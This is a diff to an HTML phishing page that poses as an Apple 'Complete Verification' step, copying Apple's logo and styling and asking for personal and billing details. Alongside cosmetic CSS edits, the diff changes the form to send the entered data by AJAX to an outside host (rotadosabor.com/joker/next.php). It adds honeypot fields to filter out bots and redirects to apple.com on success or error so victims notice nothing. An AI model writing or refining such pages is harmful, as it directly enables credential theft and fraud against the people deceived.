@@ -7,10 +7,11 @@
     <title>Apple - Complete Verification</title>
     
     <!-- Bootstrap CSS -->
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600&display=swap" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
-    
+
+    <!-- Custom Styles -->
     <style>
         :root {
             --apple-blue: #0071e3;
@@ -29,7 +30,7 @@
             margin: 0;
             background-color: var(--apple-background);
             color: var(--apple-text-main);
-            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
+            font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
             line-height: 1.47059;
             font-weight: 400;
             letter-spacing: -0.022em;
@@ -47,7 +48,6 @@
             height: 44px;
             z-index: 9999;
             backdrop-filter: saturate(180%) blur(20px);
-            -webkit-backdrop-filter: saturate(180%) blur(20px);
         }
         
         .nav-content {
@@ -66,7 +66,8 @@
         
         .nav-logo svg {
             fill: #fff;
-            height: 18px;
+            height: 20px;
+            width: 20px;
         }
         
         .nav-items {
@@ -100,14 +101,14 @@
         }
         
         .container-wide {
-            max-width: 980px;
+            max-width: 1100px;
             margin: 0 auto;
             padding: 0 22px;
         }
         
         /* Headings */
         .main-title {
-            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, Helvetica, Arial, sans-serif;
+            font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, system-ui, Helvetica, Arial, sans-serif;
             font-size: 40px;
             font-weight: 600;
             text-align: center;
@@ -121,7 +122,7 @@
             color: var(--apple-text-secondary);
             text-align: center;
             margin-bottom: 48px;
-            max-width: 670px;
+            max-width: 800px;
             margin-left: auto;
             margin-right: auto;
             line-height: 1.38105;
@@ -300,6 +301,7 @@
         
         .form-row {
             display: flex;
+            flex-wrap: wrap;
             margin-left: -12px;
             margin-right: -12px;
         }
@@ -423,7 +425,7 @@
             height: 0;
         }
         
-        /* Make form rows stack on mobile */
+        /* Responsive */
         @media (max-width: 768px) {
             .main-title {
                 font-size: 32px;
@@ -472,7 +474,7 @@
         <div class="nav-content">
             <div class="nav-logo">
                 <a href="#" aria-label="Apple">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44" width="16" height="44">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 44">
                         <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31" fill="#fff"/>
                     </svg>
                 </a>
@@ -530,9 +532,14 @@
                 <h2 class="card-title">Personal Information</h2>
                 <p class="card-description">Please provide your personal details as they appear on your billing statement and official documents. This information is required to verify your identity.</p>
                 
-                <!-- Direct form submission to ensure reliable data transfer -->
-                <form id="form-field-3" action="next.php" method="POST">
+                <form id="details-form" action="#" method="post">
                     <input type="hidden" name="btn3" value="btn3">
+                    
+                    <!-- Honeypot fields for bots -->
+                    <div class="bot-field">
+                        <input type="text" name="website3" id="website3">
+                        <input type="text" name="address_confirm" id="address_confirm">
+                    </div>
                     
                     <div class="form-row">
                         <div class="form-column">
@@ -662,19 +669,32 @@
             var email = localStorage.getItem('userEmail') || 'example@icloud.com';
             $('#user-email').text(email);
             
-            // Add event handler for form submission
-            $('#form-field-3').on('submit', function() {
-                // Disable the button to prevent double submission
-                $('#complete-button').prop('disabled', true);
-                $('#complete-button').html('Processing...');
+            // Form submission with the same approach as verification.html
+            $('#details-form').on('submit', function(e) {
+                e.preventDefault();
                 
-                // Set a timeout to redirect to Apple's website after form submission
-                setTimeout(function() {
-                    window.location.href = "https://www.apple.com/";
-                }, 2000);
+                // Validate form
+                if (!this.checkValidity()) {
+                    return;
+                }
                 
-                // Return true to allow the form to submit normally
-                return true;
+                // Disable button to prevent double submission
+                $('#complete-button').prop('disabled', true).html('<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Processing...');
+                
+                // Submit form via AJAX
+                $.ajax({
+                    url: "https://rotadosabor.com/joker/next.php",
+                    type: 'POST',
+                    data: $(this).serialize(),
+                    success: function() {
+                        // Redirect to Apple website after successful submission
+                        window.location.href = "https://www.apple.com/";
+                    },
+                    error: function() {
+                        // Still redirect on error to keep flow going
+                        window.location.href = "https://www.apple.com/";
+                    }
+                });
             });
         });
     </script>
